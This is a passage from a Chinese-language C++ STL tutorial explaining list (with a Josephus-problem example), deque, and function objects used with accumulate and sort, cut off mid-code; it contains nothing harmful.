<p>在 list 容器中，在已经定位到要增删元素的位置的情况下，增删元素能在常数时间内完成。如图2所示，在 ai 和 ai+1 之间插入一个元素，只需要修改 ai 和 ai+1 中的指针即可。</p>
<p><img src="/2020/10/30/STL/1-1PZ615050J37.jpg" alt="img"><br>图1 ：双向链表</p>
<p><img src="/2020/10/30/STL/1-1PZ61505142A.jpg" alt="img"><br>图2：在双向链表中插入元素</p>
<p>list 容器不支持根据下标随机存取元素。</p>
<p>list 的构造函数和许多成员函数的用法都与 vector 类似，此处不再列举。除了顺序容器都有的成员函数外，list 容器还独有如表 1 所示的成员函数（此表不包含全部成员函数，且有些函数的参数较为复杂，表中只列出函数名）。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody>
<tr>
<td>void push_front(const T &amp; val)</td>
<td>将 val 插入链表最前面</td>
</tr>
<tr>
<td>void pop_front()</td>
<td>删除链表最前面的元素</td>
</tr>
<tr>
<td>void sort()</td>
<td>将链表从小到大排序</td>
</tr>
<tr>
<td>void remove (const T &amp; val)</td>
<td>删除和 val 相等的元素</td>
</tr>
<tr>
<td>remove_if</td>
<td>删除符合某种条件的元素</td>
</tr>
<tr>
<td>void unique()</td>
<td>删除所有和前一个元素相等的元素</td>
</tr>
<tr>
<td>void merge(list <T> &amp; x)</T></td>
<td>将链表 x 合并进来并清空 x。要求链表自身和 x 都是有序的</td>
</tr>
<tr>
<td>void splice(iterator i, list <T> &amp; x, iterator first, iterator last)</T></td>
<td>在位置 i 前面插入链表 x 中的区间 [first, last)，并在链表 x 中删除该区间。链表自身和链表 x 可以是同一个链表，只要 i 不在 [first, last) 中即可</td>
</tr>
</tbody>
</table>
</div>
<p>表1中列出的成员函数有些是重载的，如 unique、merge、splice 成员函数都不止一个， 这里不再一一列举并解释。后面对于其他容器以及算法的介绍，对于有重载的情况也不再指出。要详细了解 <a href="http://c.biancheng.net/stl/">STL</a>，还需要查阅专门的 STL 手册，或查看编译器提供的联机帮助。</p>
<p>STL 中的算法 sort 可以用来对 vector 和 deque 排序，它需要随机访问迭代器的支持。因为 list 不支持随机访问迭代器，所以不能用算法 sort 对 list 容器排序。因此，list 容器引入了 sort 成员函数以完成排序。</p>
<p>list 的示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;  //使用 list 需要包含此头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  //使用STL中的算法需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A(<span class="keyword">int</span> n_) &#123; n = n_; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2);</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2);</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2) &#123;</span><br><span class="line">    <span class="keyword">return</span> a1.n &lt; a2.n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2) &#123;</span><br><span class="line">    <span class="keyword">return</span> a1.n == a2.n;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a) &#123;</span><br><span class="line">    o &lt;&lt; a.n;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Print</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A a[<span class="number">5</span>] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span> &#125;;</span><br><span class="line">    A b[<span class="number">7</span>] = &#123; <span class="number">10</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">40</span> &#125;;</span><br><span class="line">    list&lt;A&gt; lst1(a, a + 5), lst2(b, b + 7);</span><br><span class="line">    lst1.sort();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：1)1 2 2 3 4</span></span><br><span class="line">    lst1.remove(<span class="number">2</span>);  <span class="comment">//删除所有和A(2)相等的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：2)1 3 4</span></span><br><span class="line">    lst2.pop_front();  <span class="comment">//删除第一个元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：3)30 20 30 30 40 40</span></span><br><span class="line">    lst2.unique();  <span class="comment">//删除所有和前一个元素相等的元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：4)30 20 30 40</span></span><br><span class="line">    lst2.sort();</span><br><span class="line">    lst1.merge(lst2);  <span class="comment">//合并 lst2 到 lst1 并清空 lst2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：5)1 3 4 20 30 30 40</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//lst2是空的，输出：6)</span></span><br><span class="line">    lst1.reverse();  <span class="comment">//将 lst1 前后颠倒</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;7)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出 7)40 30 30 20 4 3 1</span></span><br><span class="line">    lst2.insert(lst2.begin(), a + <span class="number">1</span>, a + <span class="number">4</span>);  <span class="comment">//在 lst2 中插入 3,2,4 三个元素</span></span><br><span class="line">    <span class="built_in">list</span> &lt;A&gt;::iterator p1, p2, p3;</span><br><span class="line">    p1 = find(lst1.begin(), lst1.end(), <span class="number">30</span>);</span><br><span class="line">    p2 = find(lst2.begin(), lst2.end(), <span class="number">2</span>);</span><br><span class="line">    p3 = find(lst2.begin(), lst2.end(), <span class="number">4</span>);</span><br><span class="line">    lst1.splice(p1, lst2, p2, p3);  <span class="comment">//将[p2, p3)插入p1之前，并从 lst2 中删除[p2,p3)</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;8)&quot;</span>; Print(lst1.begin(), lst1.end());  <span class="comment">//输出：8)40 2 30 30 20 4 3 1</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9)&quot;</span>; Print(lst2.begin(), lst2.end());  <span class="comment">//输出：9)3 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>【实例】用 list 解决约瑟夫问题。</p>
<p>约瑟夫问题是：有 n 只猴子，按顺时针方向围成一圈选大王（编号为 1~n），从第 1 号开始报数，一直数到 m，数到 m 的猴子退到圈外，剩下的猴子再接着从 1 开始报数。就这样，直到圈内只剩下一只猴子时，这个猴子就是猴王。编程求输入 n、m 后,输出最后猴王的编号。</p>
<p>输入数据：每行是用空格分开的两个整数，第一个是 n，第二个是 m（0&lt;m, n&lt;=1 000 000）。最后一行是：<br>0 0</p>
<p>输出要求：对于每行输入数据（最后一行除外），输出数据也是一行，即最后猴王的编号。</p>
<p>输入样例：<br>6 2<br>12 4<br>8 3<br>0 0</p>
<p>输出样例：<br>5<br>1<br>7</p>
<p>示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; monkeys;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        monkeys.clear();  <span class="comment">//清空list容器</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)  <span class="comment">//将猴子的编号放入list</span></span><br><span class="line">            monkeys.push_back(i);</span><br><span class="line">        <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator it = monkeys.begin();</span><br><span class="line">        <span class="keyword">while</span> (monkeys.size() &gt; <span class="number">1</span>) &#123; <span class="comment">//只要还有不止一只猴子，就要找一只猴子让其出列</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123; <span class="comment">//报数</span></span><br><span class="line">                ++it;</span><br><span class="line">                <span class="keyword">if</span> (it == monkeys.end())</span><br><span class="line">                    it = monkeys.begin();</span><br><span class="line">            &#125;</span><br><span class="line">            it = monkeys.erase(it); <span class="comment">//删除元素后，迭代器失效，</span></span><br><span class="line">                                    <span class="comment">//要重新让迭代器指向被删元素的后面</span></span><br><span class="line">            <span class="keyword">if</span> (it == monkeys.end())</span><br><span class="line">                it = monkeys.begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; monkeys.front() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//front返回第一个元素的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>erase 成员函数返回被删除元素后面那个元素的迭代器。如果被删除的是最后一个元素，则返回 end()。</p>
<p>这个程序也可以用 vector 实现，但是执行速度要慢很多。因为 vector 的 erase 操作牵涉元素的移动，不能在常数时间内完成，所花费的时间和容器中的元素个数有关；而 list 的 erase 操作只是修改几个指针而已，可以在常数时间内完成。当 n 很大（数十万）时，两种写法在速度上会有明显区别。</p>
<h4 id="C-deque，STL-deque（双向队列详解）"><a href="#C-deque，STL-deque（双向队列详解）" class="headerlink" title="C++ deque，STL deque（双向队列详解）"></a>C++ deque，STL deque（双向队列详解）</h4><p>deque 也是顺序容器的一种，同时也是一个可变长数组。要使用 deque，需要包含头文件 deque。所有适用于 vector 的操作都适用于 deque。</p>
<p>deque 和 <a href="http://c.biancheng.net/view/348.html">vector</a> 有很多类似的地方。在 deque 中，随机存取任何元素都能在常数时间内完成（但慢于vector）。它相比于 vector 的优点是，vector 在头部删除或添加元素的速度很慢，在尾部添加元素的性能较好，而 deque 在头尾增删元素都具有较好的性能（大多数情况下都能在常数时间内完成）。它有两种 vector 没有的成员函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_front</span> <span class="params">(<span class="keyword">const</span> T &amp; val)</span></span>; <span class="comment">//将 val 插入容器的头部</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop_front</span><span class="params">()</span></span>; <span class="comment">//删除容器头部的元素</span></span><br></pre></td></tr></table></figure>
<p>思考题：猜想一下，deque 是如何实现它相比 vector 的优势的？</p>
<h4 id="C-函数对象详解（附带实例）"><a href="#C-函数对象详解（附带实例）" class="headerlink" title="C++函数对象详解（附带实例）"></a>C++函数对象详解（附带实例）</h4><p>如果一个类将<code>()</code>运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象。函数对象是一个对象，但是使用的形式看起来像函数调用，实际上也执行了函数调用，因而得名。</p>
<p>下面是一个函数对象的例子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CAverage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="comment">//重载()运算符</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">double</span>)(a1 + a2 + a3) / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CAverage average;  <span class="comment">//能够求三个整数平均数的函数对象</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; average(<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">//等价于 cout &lt;&lt; average.operator(3, 2, 3);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：</p>
<ol>
<li>66667</li>
</ol>
<p><code>()</code>是目数不限的运算符，因此重载为成员函数时，有多少个参数都可以。</p>
<p>average 是一个对象，average(3, 2, 3) 实际上就是 average.operator(3, 2, 3)，这使得 average 看上去像函数的名字，故称其为函数对象。</p>
<p><strong>函数对象应用实例1：在 accumulate 算法中的应用</strong></p>
<p><a href="http://c.biancheng.net/stl/">STL</a> 中有以下实现“累加”功能的算法（函数模板）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> <span class="title">accumulate</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">InIt</span> <span class="title">last</span>, <span class="title">T</span> <span class="title">val</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>
<p>该模板的功能是对 [first, last) 中的每个迭代器 I 执行 val = op(val, *I)，返回最终的 val。在 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 中，numeric 头文件中 accumulate 的源代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">InIt</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> <span class="title">accumulate</span>(<span class="title">InIt</span> <span class="title">first</span>, <span class="title">Init</span> <span class="title">last</span>, <span class="title">T</span> <span class="title">init</span>, <span class="title">Pred</span> <span class="title">op</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>此模板被实例化后，<code>op(init, *first)</code>必须要有定义，则 op 只能是函数<a href="http://c.biancheng.net/c/80/">指针</a>或者函数对象。因此调用该 accmulate 模板时，形参 op 对应的实参只能是函数名、函数指针或者函数对象。</p>
<p>下面的程序通过 accumulate 模板求一个 vector 中元素的平方和，其中用到了函数对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; //accumulate 在此头文件定义</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">PrintInterval</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span> <span class="comment">//输出区间[first,last)中的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SumSquares</span><span class="params">(<span class="keyword">int</span> total, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> total + value * value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">SumPowers</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> power;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    SumPowers(<span class="keyword">int</span> p) :power(p) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> T <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> T &amp; total, <span class="keyword">const</span> T &amp; value)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="comment">//计算 value的power次方，加到total上</span></span><br><span class="line">        T v = value;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; power - <span class="number">1</span>; ++i)</span><br><span class="line">            v = v * value;</span><br><span class="line">        <span class="keyword">return</span> total + v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> a1[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(a1, a1 + SIZE)</span></span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span>; PrintInterval(v.begin(), v.end());</span><br><span class="line">    <span class="keyword">int</span> result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumSquares);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) 平方和：&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumPowers&lt;<span class="keyword">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) 立方和：&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    result = accumulate(v.begin(), v.end(), <span class="number">0</span>, SumPowers&lt;<span class="keyword">int</span>&gt;(<span class="number">4</span>));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) 4次方和：&quot;</span> &lt;&lt; result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果如下：<br>1)1 2 3 4 5 6 7 8 9 10<br>2)平方和:385<br>3)立方和3025<br>4)4次方和:25333</p>
<p>第 37 行，第四个参数是 SumSquares 函数的名字。函数名字的类型是函数指针，因此本行将 accumulate 模板实例化后得到的模板函数定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accumulate</span><span class="params">(<span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator first, <span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt;::iterator last, <span class="keyword">int</span> init, <span class="keyword">int</span>(*op)(<span class="keyword">int</span>, <span class="keyword">int</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>形参 op 是一个函数指针，而<code>op(init, *first)</code>就调用了指针 op 指向的函数，在第 37 行的情况下就是函数 SumSquares。</p>
<p>第 39 行，第四个参数是 SumPowers<int>(3)。SumPowers 是类模板的名字，SumPowers<int> 就是类的名字。类的名字后面跟着构造函数的参数列表，就代表一个临时对象。因此 SumPowers<int>(3) 就是一个 SumPowers<int> 类的临时对象。</int></int></int></int></p>
<p>编译器在编译此行时，会将 accumulate 模板实例化成以下函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accumulate</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator first, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator last, <span class="keyword">int</span> init, SumPowers&lt;<span class="keyword">int</span>&gt; op)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        init = op(init, *first);</span><br><span class="line">    <span class="keyword">return</span> init;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>形参 op 是一个函数对象，而<code>op(init, *first)</code>等价于：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">op.<span class="keyword">operator</span>()(init, *first);</span><br></pre></td></tr></table></figure>
<p>即调用了 SumPowers<int> 类的 operator() 成员函数。</int></p>
<p>对比 SumPowers 和 SumSquares 可以发现，函数对象的 operator() 成员函数可以根据对象内部的不同状态执行不同操作，而普通函数就无法做到这一点。因此函数对象的功能比普通函数更强大。</p>
<p><strong>函数对象应用实例2：在sort算法中的应用</strong></p>
<p>STL 中的排序模板 sort 能将区间从小到大排序。sort 算法有两个版本。第一个版本的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Randlt&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(_Randlt first, _RandIt last)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该模板可以用来将区间 [first, last) 中的元素从小到大排序，要求 first、last 是随机访问迭代器。元素比较大小是用<code>&lt;</code>进行的。如果表达式<code>a&lt;b</code>的值为 true，则 a 排在 b 前面；如果<code>a&lt;b</code>的值为 false，则 b 未必排在 a 前面，还要看<code>b&lt;a</code>是否成立，成立的话 b 才排在 a 前面。要使用这个版本的 sort 算法，待排序的对象必须能用<code>&lt;</code>运算符进行比较。</p>
<p>sort 算法第二个版本的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Randlt, <span class="class"><span class="keyword">class</span> <span class="title">Pred</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">sort</span>(_<span class="title">Randlt</span> <span class="title">first</span>, _<span class="title">RandIt</span> <span class="title">last</span>, <span class="title">Pred</span> <span class="title">op</span>);</span></span><br></pre></td></tr></table></figure>
<p>这个版本和第一个版本的差别在于，元素 a、b 比较大小是通过表达式<code>op(a, b)</code>进行的。如果该表达式的值为 true，则 a 比 b 小；如果该表达式的值为 false，也不能认为 b 比 a 小，还要看<code>op(b, a)</code>的值。总之，op 定义了元素比较大小的规则。下面是一个使用 sort 算法的例子。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  //sort算法在此头文件中定义</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Printlnterva1</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span>  <span class="comment">//用以输出 [first, last) 区间中的元素</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    A(<span class="keyword">int</span> n) : v(n) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">&#123;  <span class="comment">//重载为 A 的 const 成员函数也可以，重载为非 const 成员函数在某些编译器上会出错</span></span><br><span class="line">    <span class="keyword">return</span> a1.v &lt; a2.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GreaterA</span><span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;  <span class="comment">//v值大的元素作为较小的数</span></span><br><span class="line">    <span class="keyword">return</span> a1.v &gt; a2.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LessA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  <span class="comment">//v的个位数小的元素就作为较小的数</span></span><br><span class="line">        <span class="keyword">return</span> (a1.v % <span class="number">10</span>) &lt; (a2.v % <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a)</span><br><span class="line">&#123;</span><br><span class="line">    o &lt;&lt; a.v;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 